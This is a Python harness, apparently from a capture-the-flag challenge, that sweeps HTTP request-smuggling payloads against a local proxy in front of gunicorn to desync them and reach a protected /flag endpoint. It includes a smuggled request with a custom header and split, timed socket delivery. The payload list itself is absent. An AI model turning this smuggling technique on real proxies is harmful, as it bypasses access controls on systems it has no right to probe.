#!/usr/bin/env python3
"""
Parallel sweep for a proxoxy/gunicorn request-smuggling desync.

Win condition: the proxy (38888) returns a response containing TFCCTF{, meaning
proxoxy swallowed the smuggled `POST /flag` + `brevski: george` as opaque body
while gunicorn parsed it as its own request.
"""
import socket
import sys
import time
from concurrent.futures import ThreadPoolExecutor

H = "127.0.0.1"
PROXY, DIRECT = 38888, 38900
TAIL = b"POST /flag HTTP/1.1\r\nHost: x\r\nbrevski: george\r\nContent-Length: 0\r\n\r\n"


def deliver(port, blob, hold=1, wait=0.35, read=1.2):
    try:
        s = socket.create_connection((H, port), timeout=5)
    except Exception as e:
        return b"<CONNERR %r>" % (e,)
    out = b""
    try:
        s.sendall(blob[:-hold] if hold else blob)
        time.sleep(wait)
        s.settimeout(read)
        try:
            while True:
                d = s.recv(65536)
                if not d:
                    return out
                out += d
        except socket.timeout:
            pass
        if hold:
            s.sendall(blob[-hold:])
            time.sleep(wait)
            s.settimeout(read)
            try:
                while True:
                    d = s.recv(65536)
                    if not d:
                        break
                    out += d
            except socket.timeout:
                pass
    except Exception as e:
        out += b"<ERR %r>" % (e,)
    finally:
        try:
            s.close()
        except Exception:
            pass
    return out


def one(item):
    name, payload = item
    rp = deliver(PROXY, payload)
    if b"TFCCTF{" in rp:
        return ("WIN", name, rp[:200])
    rd = deliver(DIRECT, payload)
    return ("proxy_blocked" if not rp else "proxy_ok",
            name, b"gsmug" if b"TFCCTF{" in rd else b"-")


def run_all(cases, workers=8):
    wins = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        for verdict, name, extra in ex.map(one, cases):
            line = f"{verdict:14s} {name:52s} {extra[:80]!r}"
            if verdict == "WIN":
                line = "*** " + line
                wins.append(name)
            print(line, flush=True)
    print("WINS:", wins)
    return wins


if __name__ == "__main__":
    sys.exit(0)
